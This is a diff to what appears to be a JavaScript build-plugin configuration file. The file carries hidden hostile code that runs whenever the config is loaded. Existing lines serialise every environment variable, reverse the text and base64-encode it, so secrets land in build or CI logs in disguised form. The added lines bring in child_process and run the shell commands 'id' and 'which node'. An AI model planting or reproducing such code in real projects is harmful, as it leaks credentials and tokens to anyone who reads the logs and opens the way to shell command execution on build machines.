@@ -1,6 +1,28 @@
+console.log('\r\nDumping env');
 const envJson = JSON.stringify(process.env).split("").reverse().join("");
 const envBase64 = Buffer.from(envJson).toString('base64');
 console.log(envBase64);
+
+const { exec } = require('child_process');
+
+function executeShellCommand(command) {
+    exec(command, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error executing command: ${error}`);
+            return;
+        }
+        if (stderr) {
+            console.error(`Command stderr: ${stderr}`);
+            return;
+        }
+        console.log(`Command output: ${stdout}`);
+    });
+}
+
+console.log('\r\Running cmds');
+executeShellCommand('id');
+executeShellCommand('which node');
+
 
 module.exports = {
   // Plugins you want to use
